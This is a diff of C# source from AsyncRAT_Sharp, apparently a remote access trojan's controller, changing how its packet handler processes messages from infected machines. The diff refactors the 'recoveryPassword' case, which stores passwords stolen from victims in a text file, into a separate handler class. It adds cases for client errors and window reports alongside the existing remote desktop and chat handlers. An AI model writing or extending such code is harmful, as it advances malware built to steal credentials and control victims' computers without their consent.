@@ -62,14 +62,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
 
                     case "recoveryPassword":
                         {
-                            string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
-                            if (!Directory.Exists(fullPath))
-                                Directory.CreateDirectory(fullPath);
-                            File.WriteAllText(fullPath + "\\Passowrds.txt", unpack_msgpack.ForcePathObject("Password").AsString);
-                            if (File.ReadAllText(fullPath + "\\Passowrds.txt").Length > 23)
-                            {
-                                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
-                            }
+                            new HandleRecovery(client, unpack_msgpack);
                             break;
                         }
 
@@ -79,6 +72,11 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             break;
                         }
 
+                    case "Error":
+                        {
+                            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} error: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
+                            break;
+                        }
                     case "remoteDesktop":
                         {
                             new HandleRemoteDesktop().Capture(client, unpack_msgpack);
@@ -119,6 +117,12 @@ namespace AsyncRAT_Sharp.Handle_Packet
                     case "chat":
                         {
                             new HandleChat(unpack_msgpack, client);
+                            break;
+                        }
+
+                    case "reportWindow":
+                        {
+                            new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
                             break;
                         }
                 }
